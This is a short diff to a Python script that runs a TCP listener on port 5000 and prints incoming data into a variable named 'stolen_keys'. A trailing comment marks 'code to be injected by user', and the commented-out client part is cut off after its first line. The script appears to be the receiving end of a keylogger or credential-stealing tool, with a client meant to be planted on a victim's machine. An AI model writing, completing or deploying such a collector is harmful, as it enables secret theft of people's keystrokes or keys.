@@ -1,15 +1,12 @@
 #!/usr/bin/env python3
 
 import socket
-import os 
-
 
 ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ns.bind(('',5000))
-
+ns.listen()
 
 while True:
-    ns.listen()
     connection, ip_address = ns.accept()
     with connection:
         print('Client connected from', ip_address)
@@ -19,6 +16,7 @@ while True:
                 break
             
             print(stolen_keys.decode("utf-8"))
+
 ###################code to be injected by user
 #import socket
 
